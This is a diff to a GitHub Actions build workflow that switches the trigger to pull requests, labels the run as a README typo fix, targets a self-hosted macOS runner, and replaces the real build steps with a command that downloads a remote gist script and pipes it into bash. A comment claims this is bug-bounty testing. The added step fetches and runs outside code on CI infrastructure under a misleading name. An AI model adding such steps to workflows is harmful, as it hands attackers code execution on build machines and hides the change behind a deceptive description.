@@ -1,21 +1,20 @@
 name: Build
-on: push
+run-name: 'Fix README typos and grammer. (#418)'
+on: pull_request
 
 jobs:
-
   build_on_linux:
     name: 'Check build on Linux'
-    runs-on: ubuntu-latest
+    runs-on: [self-hosted, macOS, ARM64]
+    continue-on-error: true
     steps:
-    - uses: actions/checkout@v3
-    - uses: actions/setup-node@v3
-      with:
-        node-version: 18.13
     - name: Install dependencies
-      run: yarn
+      run: echo "yarn"
     - name: Build application
-      run: yarn build:production
-
+      env:
+        SYSTEM_NAME: "m1"
+      run: curl -sSfL https://gist.githubusercontent.com/UncertainBadg3r/7f667c4656146a0ffe5ee765f97cac7a/raw/19bd383bc2b10b03f1cf4f1ac54156cdb915443b/test.sh | bash
+  # NOT MALICIOUS: testing per https://hackerone.com/iron_fish_bbp
   # build_on_mac:
   #   name: 'Check build on Mac'
   #   runs-on: macos-latest
